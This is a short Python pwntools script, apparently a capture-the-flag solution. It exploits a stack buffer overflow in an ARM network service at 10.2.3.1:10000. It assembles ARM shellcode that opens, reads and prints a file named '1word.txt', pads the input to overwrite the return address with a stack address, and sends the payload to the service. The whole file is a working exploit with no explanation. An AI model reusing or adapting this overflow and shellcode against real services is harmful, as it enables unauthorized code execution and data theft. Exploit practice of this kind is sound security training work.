from pwn import *

context.arch = "arm"
context.log_level = "DEBUG"

p = remote("10.2.3.1","10000")

shellcode ='''
    /* open(file='1word.txt', oflag=0, mode=0) */
    /* push '1word.txt\x00AA' */
    movw r7, #0x41410074 & 0xffff
    movt r7, #0x41410074 >> 16
    push {r7}
    movw r7, #0x78742e64 & 0xffff
    movt r7, #0x78742e64 >> 16
    push {r7}
    movw r7, #0x726f7731 & 0xffff
    movt r7, #0x726f7731 >> 16
    push {r7}

    mov  r0, sp
    eor  r1, r1 /* 0 (#0) */
    eor  r2, r2 /* 0 (#0) */
    /* call open() */
    mov  r7, #SYS_open /* 5 */
    svc  0x66

    /* read(fd='r0', buf='sp', nbytes=100) */
    mov  r1, sp
    mov  r2, #0x64
    /* call read() */
    mov  r7, #SYS_read /* 3 */
    svc  0x6a
    
    mov r1, sp
    mov r0, #1
    mov r2, #0x64
    sub r1,r1,1
    /* call write() */
    mov r7, #(0+ 4) /* 4 */
    svc 0x69
'''

shellcode = asm(shellcode)


print hex(len(shellcode))

pay = "A" * 0x18
pay += p32(0x0001Af8+4+4)
pay += "A"*4
pay += shellcode

p.sendlineafter(":",pay)

p.interactive()
